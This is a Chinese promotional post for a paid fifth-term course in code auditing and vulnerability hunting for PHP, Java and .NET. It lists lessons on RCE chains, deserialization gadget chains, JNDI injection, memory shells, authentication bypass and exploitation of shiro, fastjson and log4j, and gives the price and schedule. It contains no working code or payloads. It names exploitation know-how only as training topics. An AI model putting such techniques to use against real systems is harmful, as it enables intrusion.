![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRBX1DYibSolqqXkSXKOCyQatGu1o3YJfZvnBd48hXYvpyBsHjzPIG9xCJia9pHvbNibuAbiaTLoUne14Dibp1LM0BBvNIibtQRt11ibg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kT3j5ogWvcmU3icydYHz7EGAWry9NPy6gtxN5TFReXLtLZAgibKlSycODgib0HEwC2CRWWQBaB3X3VI4w4m01RVjUbr9CV3sLldicw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=82 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTSH7IbmzRaeSwK7NBLquEj37Sv4xITrE2yibE3s0oql0wn7gN0picKszBresODUMTMEnzytZUMYE1XibkumX6caJw3ce2mceeSfU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=83 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTibG4tXbph8GhCXXw2UKKdlzDcKwgxPhA93RKbwibzRrJ0kJH0KjIGwtsNiagQPT7UAEHA4o2oMCpKiaFPdyb0AcZqOicDPkr2v6wM/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=84 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kS16oaKaZ2Pt2icTpRA8Sg6rIic5Evt3YAo5SMkKqCV83tfIickUSV0907nW8qVv1d1aWmKCLQUu7icSKpoIzxBcAJg8q49W8WCd2Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=85 "")  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
(其实报喜一个是为了宣传，更重要的其实每当学员来报喜的时候，都有一种成就感，最起码能够认定自己的课程是有一定价值一定性价比的，而且确实收了师傅们的钱，能够帮助到师傅们一些，自己也就更有坚持下去做培训的信心。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=120 "")  
  
二、第五期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=121 "")  
  
  
  
    第五期课程仍然是以代码审计为主，本次课程还是为三个语言的代码审计0-1讲解，目的为帮助学员完成0-1+1的白盒（代码审计）漏洞挖掘，并且在出货的基础上再+1去出高质量的漏洞（  
例如组合拳RCE、前台相关漏洞等）。  
  
  
1  
  
开课时间&课程周期  
  
开课时间暂定为：2026年4月3日  
  
开课周期预计到：三个月左右（直播+录播）  
  
**课程大纲**  
  
    本次课程分为PHP、JAVA、NET代码审计为直播+录播，为了照顾一些基础较为薄弱的师傅新增基础~技巧~番外（录播课程）。  
  
  
01  
  
PHP&JAVA&NET代码审计 (直播+录播)  
  
     
  
    之前课程大纲主要为xxx实战案例，本次课程大纲着重体现思路方向，并非取消了实战部分，实战部分之多不减。  
  
PHP课程目录  
  
  
✅   
   
第一节课：多框架初识&路由认识&参数传递  
  
✅   
   
第二节课：多框架&鉴权分析&认证与鉴权&鉴权方式  
  
✅   
   
第三节课：多框架&常见漏洞函数&回显&非回显  
  
✅   
   
第四节课：注入漏洞&常见位置&实战审计注入类漏洞  
  
✅   
   
第五节课：前台RCE漏洞审计&漏洞案例技巧讲解  
  
✅   
   
第六节课：门户网站CMS&网络设备&审计经验讲解  
  
✅   
   
第七节课：多框架&鉴权对抗&权限绕过技巧&案例分析  
  
✅   
   
第八节课：组合拳RCE漏洞分析&漏洞组合拳利用&案例  
  
✅   
   
第九节课：PHP下反序列化漏洞&魔术方法&pop链分析  
  
✅   
   
第十节课：PHP下反序列化漏洞实战&phar协议RCE案例  
  
  
JAVA课程目录  
  
  
✅   
   
第一节课：Servlet&Spring Boot&Spring MVC&Struts2  
  
✅   
   
第二节课：多框架下&拦截器&认证鉴权&组件鉴权分析  
  
✅   
   
第三节课：多框架下&权限绕过&鉴权对抗&案例分析  
  
✅   
   
第四节课：常见漏洞函数&案例分析&审计技巧  
  
✅   
   
第五节课：前台漏洞审计&组合拳rce漏洞&技巧&案例  
  
✅   
   
第六节课：反序列化&CC链利用&反序列化漏洞利用  
  
✅   
   
第七节课：  
Ognl&SpEl&EL表达式注入&漏洞案例  
  
✅   
   
第八节课：内存马简介&内存马原理分析&内存马注入方式  
  
✅   
   
第九节课：RMI&JNDI注入&JNDI注入漏洞利用&案例  
  
✅   
   
第十节课：组件漏洞&shiro&fastjson&log4j分析&利用  
  
  
.NET课程目录  
  
  
✅   
   
第一节课：初识.NET&Web From & MVC架构框架分析  
  
✅   
   
第二节课：Web From&MVC框架&鉴权分析&认证方式  
  
✅   
   
第三节课：多框架下&鉴权对抗&权限绕过分析&案例  
  
✅   
   
第四节课：注入漏洞分析&文件操作类漏洞&实战分析  
  
✅   
   
第五节课：常见漏洞位置&前台漏洞审计&漏洞案例讲解  
  
✅   
   
第六节课：组合拳RCE漏洞分析&组合拳RCE案例讲解  
  
✅    
第七节课：.NET反序列化漏洞初识&反序列化漏洞原理  
  
✅    
第八节课：.NET安全反序列化链&反序列化触发场景  
  
✅    
第九节课：.NET反序列化漏洞案例&反序列化漏洞分析  
  
  
02  
  
基础~技巧~番外（录播)  
  
  
该篇章为长期更新  
  
  
1  
  
基础篇章  
  
1、  
由于之前上课时部分师傅存在一定基础，刚开始的课程部分师傅认为自己可以跟的上等问题，导致时间的浪费。  
  
  
2、  
同时有一定的师傅存在无法搭建源码，以及软件下载等问题，于是将这种基础问题，统一归纳为基础篇章，供师傅们学习，节省师傅们时间提升学习效率及课程质量  
  
  
3、同时面对部分学员频繁提出的一些问题，针对该问题同样会进行解答，并且进行录制上传至基础篇章中。  
  
  
2  
  
技巧篇章  
  
1、  
随着自己技术的进步也了解到了一些新型的技巧或者手法，例如sql注入的某一个技巧，但是重新讲解又浪费大量时间，特地新增了技巧篇章，将单独的技巧进行讲解  
。  
  
  
3  
  
番外篇章  
  
1、自己在第四期讲过一些逆向相关，并且还存在相关的一些好的案例，得到了挺多师傅的认可，例如某APP接管存储桶等案例，于是之后在有好的案例将进行上传更新。  
  
**课程思维导图**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQYj2eJF0LdnX1hYdgm10iby4V0bfmKCWwsQXEjnVrh1XuJcuEFlhxKBtkJtZ5UeDiaGLia1icko6CORC6PvFQrFGDMp2TiaLiazkXIU/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=122 "")  
  
  
**常见疑问&课程讲解**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=123 "")  
  
第五期课程  
收费多少？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=124 "")  
  
本次课程收费仍然是  
1688，并且还是承诺一次报名后续不再进行任何二次收费保障（包含  
内部平台，  
以及后续推出一系列内容均可观看）。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=125 "")  
  
什么时间段上课，上课周期是多长时间？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=126 "")  
  
第五期课程【直播+录播】上课周期为  
三个月，一般集中在  
周五六日这三天，一周保持  
2～3节课，每节课  
1小时左右。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=127 "")  
  
作为学员，我们都有哪些权益？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=128 "")  
  
首先最关键的就是  
课程内容是可以一直学习的，同时  
内部报告平台也可进行观看，  
答疑是不限时长，不限类型方向，任何方向均可，再次同时代码审计最关键的就是源码，  
源码&课件&视频都是给兄弟们配套的，当然无聊找小朋友聊天一起打游戏也可以哦。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=129 "")  
  
学完之后可以达到什么水平？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=130 "")  
  
学完之后可以达到可以进行  
独立审计的水平，在面对  
php、JAVA、NET主流语言的源码，可以进行  
独立审计，  
验证漏洞，对于一些  
JAVA安全内容例如：  
反序列化，内存马等也有一定的理解，可以进行打  
反序列化漏洞、  
注入内存马等操作，同时  
PHP的反序列化、pop链，phar协议等利用也有一定理解，且此类漏洞导致RCE  
均有案例。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=131 "")  
  
0基础可以学吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=132 "")  
  
1、这是大家最常问的一个问题，  
0基础是可以的，我的代码审计课程一直秉持着  
帮助大家完成代码审计0-1的目标，同时往期（第四期）课程新增了进阶课，其目的也是帮助大家完成  
0-1出洞到0-1出有质量的漏洞。  
  
  
2、另外考虑到有的  
学员基础较为薄弱，本期同时也开了  
番外篇&基础篇，师傅们可以观看这块分区课程内容，此类分块课程目的就是为  
协助到一些基础比较薄弱的师傅们。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=133 "")  
  
是那种读PPT拿着靶场讲解吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=134 "")  
  
不会，课程均使用一些  
0Day&1Day&Nday优质漏洞来进行授课，且本期案例均为从  
简-难漏洞案例，深度体验代码审计当中的  
难易区分，  
完全杜绝靶场以及去读PPT的，从培训第一期开始到现在，基本为上课开始看几眼课件，  
让学员熟悉这节课的大概内容等信息，然后  
直接实操到下课，这一点也是  
我干培训五期以来一直使用的授课方式。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=135 "")  
  
是否有简历修改&内推等福利？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=136 "")  
  
有的兄弟，有的，  
不介意小朋友的指导简历这类的话，随时欢迎大家来骚扰我。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xblgvfap0kicWhU0Yu7COibQdbBuJvJL4V8ZibyDFtoZ1DjX4PlAzgHXV1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=137 "")  
  
为什么你不新增AI方向的内容？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/TN05MmJLxMpA2RBXPMibJ9EsZG9K2Y9Xbn64xklaibRPwn8iadq2gzV1us6KUbIGdxlicMkhBo7loMRbVQ5bDnPZqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=138 "")  
  
目前我个人认为AI可以帮助我们  
提升很大的效率，但是前提是  
AI的使用者本身要懂这个技术，才可以利用AI来  
降低该技术门槛，提升效率，  
完全自动化目前感觉还是无法做到，包括  
课程当中也会使用AI会顺带着给师傅讲了  
如何用ai来提升效率，同时如果反馈不会使用的师傅较多，会考虑后续在基础～技巧～番外来更新该方向内容。  
  
  
**联系方式**  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kScqFJPk9MMmvXyzfr0wQWM0NyTKzxmuWZk0Dqf5NIA4JgEMZEYZNDFXFUIYFdh0apgtXf8G3OlTnjTiaaLy8Xs851XiaAqa8eTM/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
  
